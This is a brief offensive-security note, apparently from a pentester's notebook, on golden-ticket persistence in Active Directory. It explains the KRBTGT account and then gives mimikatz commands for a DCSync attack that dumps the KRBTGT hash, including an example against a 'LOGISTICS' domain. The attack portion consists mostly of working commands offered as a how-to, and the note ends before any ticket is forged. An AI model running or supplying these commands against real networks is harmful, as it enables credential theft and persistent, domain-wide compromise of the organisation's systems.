-- -
We are attempting to get a KRBTGT. KRBTGT Stands for Kerberos Ticket Granting Ticket. It's a ticket for the Service Account used to encrypt and sign all Kerberos tickets granted within the given domain. Can be used to request TGS tickets for any service on any host in the domain. Also known as the #GoldenTicket. This is a well-known #persistence method. 
#### Attack
After you have domain admin (or similar), log into said privileged account on a host (or DC) in the domain. Run DCSync attack to obtain the hash for the KRBTGT account.
```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:<domain>\krbtgt
lsadump::dcsync /user:LOGISTICS\krbtgt
```